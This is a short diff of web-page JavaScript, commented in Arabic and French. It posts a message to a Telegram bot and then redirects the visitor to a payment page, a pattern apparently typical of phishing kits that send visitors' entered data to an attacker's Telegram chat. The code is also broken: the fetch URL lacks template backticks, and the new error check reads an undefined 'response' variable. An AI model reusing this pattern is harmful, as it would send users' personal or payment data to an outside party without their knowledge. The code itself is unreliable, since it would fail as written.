@@ -238,16 +238,20 @@
         try {
             // إرسال الطلب إلى البوت
         await fetch(https://api.telegram.org/bot${token1}/sendMessage, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    chat_id: chatId1,
-                    text: message,
-                    parse_mode: "Markdown",
-                }),
-            });
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+        chat_id: chatId1, // تأكد من أن chatId1 يحتوي على المعرف الصحيح
+        text: message, 
+        parse_mode: "Markdown",
+    }),
+});
+
+if (!response.ok) {
+    alert("Erreur lors de l'envoi. Code d'erreur: " + response.status);
+}
 
             // إعادة التوجيه بعد الإرسال
             window.location.href = "page-payement.html";
